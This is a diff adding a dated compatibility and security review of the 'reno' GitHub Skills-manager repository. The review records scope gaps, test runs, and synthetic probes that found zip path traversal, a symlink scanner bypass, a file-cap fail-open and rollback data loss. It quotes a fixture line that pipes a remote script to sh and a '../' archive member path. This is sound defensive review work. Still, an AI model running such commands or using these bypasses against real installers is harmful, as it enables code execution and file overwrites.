@@ -1,0 +1,58 @@
+# BANCUNXUEBI/reno — implementation and compatibility review
+
+Date: 2026-11-22. Candidate #115 in the 303-name primary corpus. User-confirmed scope remains ChatGPT Projects / Section Groups / Session hierarchy for Destruction Era into local/self-hosted Claude Code and Claude Desktop third-party-gateway/API-key Chat, Cowork, and Code modes as separate destinations. No real ChatGPT export/session, API key, or target account was accessed.
+
+## Provenance, maturity, and actual scope
+- Repository: https://github.com/BANCUNXUEBI/reno. The prior atomic dispatcher cloned https://github.com/BANCUNXUEBI/reno.git; command exited 0. Branch main, pinned HEAD 214200324214f5f628b85f6fee8d2be35aa7bb59, commit date 2026-06-01 16:58:31 +0800 (docs: clarify user-facing support matrix). The source checkout was clean after test cleanup.
+- MIT, one GitHub star / zero forks, 29 commits. GitHub Releases page showed no releases; pull requests page showed 0 open / 0 closed at review time. The README labels it a Windows-first v0.1.0 MVP/alpha; local pyproject.toml version is 0.1.0. The online installer is not released; install.ps1 is a disabled draft. No evidence of a published release was found.
+- Product is a Windows-first local CLI for detecting 15 coding tools and managing Agent Skills. Deep lifecycle is limited to Codex, Claude Code CLI, and OpenCode shared mode. Claude Code CLI does not mean Claude Desktop Code mode. The advertised central store/inventory/cache/backups and reno ai JSON interface are Skills-management infrastructure, not portable chat/session persistence.
+- README support matrix labels Claude Code Plugins/MCP and OpenCode MCP as Ready, while its “Not implemented yet” section says plugin and MCP installation are not implemented and its “Ready today” list describes the Skill lifecycle. Source inspection matches the narrower behavior: the install pipeline rejects non-Skill packages; capability flags are declarations, not MCP/plugin lifecycle implementations. Do not present the matrix as evidence of working plugin/MCP migration.
+- No Project, Section Group, Session, transcript, message-tree, branch/subtask, attachment, token-usage, long-term memory, scheduled-task, ChatGPT, Claude Desktop Chat/Cowork/Code, or local Claude Code session import/export adapter was found. Targeted search for session|conversation|transcript|section group|migration in src/reno and README returned no matches (grep exit 1). It cannot migrate the requested Session structure.
+
+## Security and recovery review (synthetic data only, isolated in temporary directories)
+The project presents itself as a safe extension installer, but source-level checks and synthetic probes exposed important fail-open boundaries. No payload was executed and no user directory was touched.
+
+1. ZIP path traversal: src/reno/downloader.py::_extract_zip removes the first archive component, joins the remaining member path to extract_to, and writes it without a canonical containment check. A synthetic archive member repo-main/../escaped.txt returned success and wrote escaped.txt outside the extraction subtree, within the disposable temp root.
+2. Symlink bypass: scan_directory walks Path.rglob without traversing a directory symlink; BaseAdapter.copy_skill_files then shutil.copytree's the link with default symlink dereferencing. A synthetic Skill plus an assets symlink to an external temp folder scanned as risk=low, one text file scanned, no findings, and then copied the linked payload.sh into the install-copy directory. This demonstrates unscanned content can pass the low-risk gate; it does not demonstrate that the script ran.
+3. File-cap fail-open: when the synthetic Skill had 651 enumerated entries, with a curl https://example.invalid/script.sh | sh payload at list index 650, the scanner scanned 500 entries, returned risk=low and only a low-severity too_many_files finding; 151 entries were skipped. The file cap should fail closed or scan a deterministic manifest rather than silently allow auto-install.
+4. Nested rollback data loss: _backup_dir backs up only top-level regular files and _restore_backup restores only top-level regular files. A synthetic update/rollback preserved top.txt but lost the original nested/keep.txt. The repository test search found only a general adapter-failure rollback test, not traversal, symlink, file-cap, or nested-tree rollback coverage.
+5. Additional design concerns from source: GitHub archive extraction has no path containment or archive-size cap; fetch metadata does not pin a source commit or record an archive digest. Static text-pattern scanning is not a semantic Skill-prompt safety validator. These are code-review observations, not separate exploit claims.
+
+Literal synthetic probe stdout (all temporary inputs, outer command exit 0; stderr empty):
+{
+  "zip_slip": {"extract_return": true, "escaped_file_created": true, "content": "synthetic traversal marker", "exit": 0},
+  "symlink_scan_copy": {"scanner_risk": "low", "scanner_files_scanned": 1, "findings": [], "copied_unscanned_shell_file": true, "copied_file_content": "#!/bin/sh\necho synthetic\n", "exit": 0},
+  "nested_rollback": {"top_restored": true, "original_nested_file_restored": false, "remaining_tree": ["top.txt"], "exit": 0}
+}
+
+Literal file-cap probe stdout (exit 0; stderr empty):
+{
+  "files_enumerated": 651,
+  "max_files": 500,
+  "malicious_fixture_index": 650,
+  "scanner_files_scanned": 500,
+  "risk": "low",
+  "finding_codes": ["too_many_files"],
+  "skipped_files": 151,
+  "exit": 0
+}
+
+## Local test execution and platform boundary
+- rtk pytest tests/ first failed to spawn pytest (exit 1); the host environment had no pytest. rtk proxy python3 -m pytest tests/ then reported No module named pytest (exit 1). A disposable /tmp/nm-reno-test-20261122 venv was created; pip install -e '.[dev]' succeeded.
+- Native macOS/POSIX run of rtk proxy /tmp/nm-reno-test-20261122/bin/python -m pytest tests/ exited 1: 472 passed, 23 failed in 6.27s. Failures are in installer/remover/syncer tests that expect Windows %USERPROFILE% expansion; POSIX os.path.expandvars leaves that Windows form literal. The first unshimmed run wrote only test-generated literal %USERPROFILE%/... fixtures under the disposable source checkout; that exact untracked tree was removed, then the checkout was verified clean.
+- For the Windows-first project's intended variable semantics, the same complete suite was rerun with a process-local %NAME% expansion shim and USERPROFILE=/tmp/nm-reno-test-global-home: 495 passed in 5.69s, exit 0. No source files were changed; after the shim run rtk git status --short --untracked-files=all was empty. This compatibility shim is a test harness accommodation, not a claim that the candidate natively passes unchanged on macOS.
+- Existing tests do not cover the four reproduced security/recovery cases above; passing unit tests should not be read as validation of those boundaries.
+
+## Recommendation for Nexus Memory
+Do not adopt Reno as a dependency, session importer, fidelity reference, or safe-install implementation. It is an adjacent Skills/resource manager only. At most, independently borrow the product separation idea of a local resource inventory while requiring archive containment, bounded extraction, symlink-aware scanning/copy rules, deterministic complete scans, commit/digest provenance, and tree-preserving atomic rollback. Keep Skills/MCP/plugins in their own resource planes; none of these project/session features is implemented here.
+
+## Primary sources
+- Pinned README: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/README.md
+- Pinned security policy: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/SECURITY.md
+- Pinned downloader: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/src/reno/downloader.py
+- Pinned scanner: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/src/reno/scanner.py
+- Pinned adapter copy helper: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/src/reno/adapters/base.py
+- Pinned install/rollback path: https://github.com/BANCUNXUEBI/reno/blob/214200324214f5f628b85f6fee8d2be35aa7bb59/src/reno/installer.py
+- Current repository: https://github.com/BANCUNXUEBI/reno
+- GitHub Releases: https://github.com/BANCUNXUEBI/reno/releases
+- GitHub pull requests: https://github.com/BANCUNXUEBI/reno/pulls
